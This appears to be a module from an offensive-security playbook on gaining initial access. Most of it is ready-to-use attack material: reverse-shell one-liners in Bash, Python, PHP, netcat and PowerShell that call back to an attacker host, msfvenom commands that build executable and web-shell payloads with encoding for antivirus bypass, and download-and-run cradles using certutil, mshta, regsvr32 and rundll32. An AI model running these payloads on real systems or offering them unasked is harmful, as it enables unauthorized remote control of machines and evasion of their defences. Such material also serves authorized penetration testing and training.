# Module 05: Initial Access (Shells & Payloads)

## When to Use This Module
Use this module when you've identified a remote code execution vector (SQLi, LFI, file upload, command injection, service exploit) and need to convert it into an interactive shell. Also covers file transfer methods to get payloads onto targets and Metasploit for automated exploitation.

## Prerequisites
- RCE vector identified (from Module 03, 04, or 07)
- Listener infrastructure ready (attack box, public IP if needed)
- Payloads matched to target OS and architecture

## Entry Check

```
RCE vector confirmed?
├── Web-based RCE (upload, LFI log poison, CMDi)?
│   ├── Upload webshell first → Then upgrade to reverse/bind shell
│   └── Direct command execution → One-liner reverse shell
├── Service-based RCE (SMB, MSSQL, etc.)?
│   └── Direct payload execution via service
├── Metasploit module available?
│   ├── Yes → Use MSF for staged exploitation
│   └── No → Manual payload delivery
└── AV/EDR on target?
    ├── Yes → Encoded/obfuscated payloads, LOLBAS
    └── No → Standard payloads
```

## Shell Types & Selection

```
Which shell type?
├── Reverse shell (target connects back to us)
│   ├── PRO: More reliable, works through NAT
│   ├── CON: Requires listener, may be firewalled outbound
│   └── Use when: Target can outbound connect to us
├── Bind shell (we connect to target port)
│   ├── PRO: No outbound needed, works with restricted egress
│   ├── CON: Target must accept inbound, port may be firewalled
│   └── Use when: Target can't outbound but we can reach its port
└── Web shell (command execution via web requests)
    ├── PRO: Persists as file, easy to access
    ├── CON: Non-interactive, limited functionality
    └── Use when: Only HTTP access available
```

## Reverse Shell One-Liners

```bash
# Linux targets — try in order

# Bash
bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER>",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<ATTACKER>",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (if installed)
nc -e /bin/sh <ATTACKER> <PORT>

# OpenBSD netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER> <PORT> >/tmp/f

# PowerShell (Windows)
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('<ATTACKER>',PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Listener Setup

```bash
# Netcat listener (basic)
nc -lvnp <PORT>

# Socat listener (better for TTY)
socat file:`tty`,raw,echo=0 TCP-L:<PORT>

# Metasploit multi-handler (for staged payloads)
msfconsole -q
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run
```

## MSFvenom Payload Generation

```bash
# Linux executable
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Windows executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# PHP web shell
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php

# ASP web shell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp

# JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw

# Staged vs stageless:
# Staged (small, needs handler): linux/x64/shell/reverse_tcp
# Stageless (self-contained): linux/x64/shell_reverse_tcp

# Encoding for AV bypass
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x86/shikata_ga_nai -i 5 -o encoded.exe
```

## File Transfer Methods

### Linux → Linux

```bash
# Python HTTP server (receive side, attacker)
python3 -m http.server 8080

# Download on target (if curl/wget available)
wget http://<ATTACKER>:8080/shell.elf
curl -O http://<ATTACKER>:8080/shell.elf

# Netcat
# Attacker: nc -lvnp 4444 < shell.elf
# Target: nc <ATTACKER> 4444 > shell.elf

# Base64 (no network needed)
# Attacker: base64 shell.elf
# Target: echo "base64_string" | base64 -d > shell.elf
```

### Linux → Windows

```bash
# Python + certutil
# Attacker: python3 -m http.server 8080
# Target: certutil -urlcache -f http://<ATTACKER>:8080/shell.exe shell.exe

# PowerShell download cradle
powershell -c "Invoke-WebRequest -Uri http://<ATTACKER>:8080/shell.exe -OutFile shell.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER>:8080/shell.exe','shell.exe')"

# SMB (impacket)
# Attacker: impacket-smbserver share . -smb2support
# Target: copy \\<ATTACKER>\share\shell.exe shell.exe

# No network (base64 encode in PowerShell)
# Target Powershell:
$data = [System.Text.Encoding]::UTF8.GetBytes("<base64>")
[System.IO.File]::WriteAllBytes("shell.exe", $data)
```

### Linux LOLBAS (Living Off the Land)

```bash
# When standard tools are blocked
certutil -urlcache -f http://<IP>/file.exe file.exe
mshta http://<IP>/shell.hta
regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=new%20ActiveXObject("WScript.Shell");o.Run("cmd /c powershell ...");
```

## AV/EDR Evasion

```
AV detected on target?
├── Living off the land (use built-in tools)
├── Encoded/encrypted payloads
├── Custom compiled payloads (not MSF default)
├── PowerShell reflection (load assemblies in memory)
├── Process injection (inject into trusted process)
└── Use Darkarmour for Linux ELF obfuscation
```

## Shell Upgrades

```bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Socat full TTY (attacker side)
socat file:`tty`,raw,echo=0 TCP-L:4444

# Socat (target side)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER>:4444

# Script trick
script /dev/null -c bash
# Then Ctrl+Z, then: stty raw -echo; fg; reset
```

## Cross-References
- For file transfer methods → [assets/cheatsheets/file-transfers.md](../assets/cheatsheets/file-transfers.md)
- For post-exploitation after shell → [Module 13: Post-Exploitation](../modules/13-post-exploitation.md)
- For Metasploit usage → [assets/cheatsheets/msfvenom.md](../assets/cheatsheets/msfvenom.md)
- For privilege escalation → [Module 09: Linux PrivEsc](../modules/09-linux-privesc.md) / [Module 10: Windows PrivEsc](../modules/10-windows-privesc.md)

## Output Summary
- [ ] Reverse/bind shell established
- [ ] Shell upgraded to full TTY (Linux) or interactive (Windows)
- [ ] Payloads transferred successfully
- [ ] AV/EDR bypasses used if needed
- [ ] Metasploit session opened (if used)
- [ ] Initial foothold documented
